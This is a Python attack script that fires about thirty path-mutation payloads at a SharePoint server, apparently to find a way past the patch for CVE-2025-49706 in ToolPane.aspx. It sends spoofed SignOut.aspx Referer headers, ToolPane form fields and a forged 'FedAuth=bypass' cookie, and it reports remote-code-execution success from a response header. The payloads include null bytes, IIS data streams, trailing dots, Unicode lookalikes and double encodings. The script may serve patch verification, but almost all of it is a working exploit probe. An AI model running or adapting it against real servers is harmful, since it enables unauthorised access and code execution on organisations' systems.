# -*- coding: utf-8 -*-
# Technology-specific quirks testing for CVE-2025-49706
# Tests ASP.NET/IIS specific behaviors that might bypass EndsWith("ToolPane.aspx")

import argparse
from urllib.parse import urlparse, quote
import requests

def test_path(base_url, path_suffix, referer="/_layouts/SignOut.aspx", cookie=None, description=""):
    """Test a path variation with optional cookie"""
    target_url = f"{base_url}{path_suffix}"
    parsed = urlparse(base_url)
    host_header = parsed.netloc or "sharepoint"

    headers = {
        "Host": host_header,
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Referer": referer,
    }

    if cookie:
        headers["Cookie"] = cookie

    # Minimal body to test processing
    body = "MSOTlPn_DWP=test&MSOTlPn_Uri=http://test"

    try:
        response = requests.post(target_url, headers=headers, data=body, timeout=10, allow_redirects=False)
        rce = "YES" if "X-YSONET" in response.headers else "NO"
        return response.status_code, rce, description
    except Exception as e:
        return "ERR", "N/A", f"{description}: {str(e)[:50]}"

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    base_url = args.url.rstrip("/")

    # Technology-specific quirks to test
    quirks = [
        # ASP.NET specific
        ("/_layouts/15/ToolPane.aspx,foo", "ASP.NET comma in path"),
        ("/_layouts/15/ToolPane.aspx;", "ASP.NET semicolon suffix"),
        ("/_layouts/15/ToolPane.aspx;foo", "ASP.NET semicolon path param"),
        ("/_layouts/15/ToolPane.aspx/..", "Path traversal in URL"),
        ("/_layouts/15/ToolPane.aspx/..%2f", "Encoded path traversal"),
        ("/_layouts/15/ToolPane.aspx%00", "Null byte injection"),
        ("/_layouts/15/ToolPane.aspx%00.txt", "Null byte with extension"),

        # IIS specific behaviors
        ("/_layouts/15/ToolPane.aspx::$DATA", "IIS alternate data stream"),
        ("/_layouts/15/ToolPane.aspx::$INDEX_ALLOCATION", "IIS index allocation"),
        ("/_layouts/15/ToolPane.aspx.", "IIS trailing dot"),
        ("/_layouts/15/ToolPane.aspx..", "IIS double trailing dot"),
        ("/_layouts/15/ToolPane.aspx...", "IIS triple trailing dot"),
        ("/_layouts/15/ToolPane.aspx ", "IIS trailing space"),
        ("/_layouts/15/ToolPane.aspx%20", "IIS encoded trailing space"),
        ("/_layouts/15/ToolPane.aspx%09", "IIS tab character"),

        # Unicode normalization attacks
        ("/_layouts/15/ToolPane.aspx\u00a0", "Non-breaking space suffix"),
        ("/_layouts/15/ToolPane.asp\uff58", "Unicode fullwidth x"),
        ("/_layouts/15/ToolPane.as\uff50x", "Unicode fullwidth p"),
        ("/_layouts/15/Tool\uff30ane.aspx", "Unicode fullwidth P"),

        # Double encoding
        ("/_layouts/15/ToolPane%252easpx", "Double-encoded dot"),
        ("/_layouts/15/ToolPane.asp%2578", "Double-encoded x"),

        # HTTP.sys specific
        ("/_layouts/15/ToolPane.aspx%c0%ae", "Overlong encoding dot"),
        ("/_layouts/15/ToolPane.aspx%c0%af", "Overlong encoding slash"),

        # Mixed case and encoding combos
        ("/_layouts/15/TOOLPANE%2eASPX", "Case + encoded dot"),
        ("/_layouts/15/toolpane%2Easpx", "Lower case + encoded dot"),

        # WebDAV-style paths
        ("/_layouts/15/ToolPane.aspx/", "WebDAV trailing slash"),
        ("/_layouts/15/ToolPane.aspx//", "WebDAV double trailing slash"),

        # Query string manipulation
        ("/_layouts/15/ToolPane.aspx?foo=ToolPane.aspx", "Query mirror"),
        ("/_layouts/15/ToolPane.aspx#anchor", "Fragment identifier"),
    ]

    print("=" * 80)
    print("Technology-Specific Quirks Testing for CVE-2025-49706")
    print("=" * 80)
    print(f"{'Status':<8} {'RCE':<5} {'Description'}")
    print("-" * 80)

    for path, desc in quirks:
        status, rce, description = test_path(base_url, path, description=desc)
        print(f"{str(status):<8} {rce:<5} {description}")

    print("\n" + "=" * 80)
    print("Testing with FedAuth cookie bypass + quirks")
    print("=" * 80)

    promising_quirks = [
        ("/_layouts/15/ToolPane.aspx.", "IIS trailing dot"),
        ("/_layouts/15/ToolPane.aspx ", "IIS trailing space"),
        ("/_layouts/15/ToolPane.aspx%00", "Null byte"),
        ("/_layouts/15/ToolPane.aspx::$DATA", "ADS"),
    ]

    for path, desc in promising_quirks:
        status, rce, description = test_path(base_url, path, cookie="FedAuth=bypass", description=f"{desc} + FedAuth")
        print(f"{str(status):<8} {rce:<5} {description}")

if __name__ == "__main__":
    main()
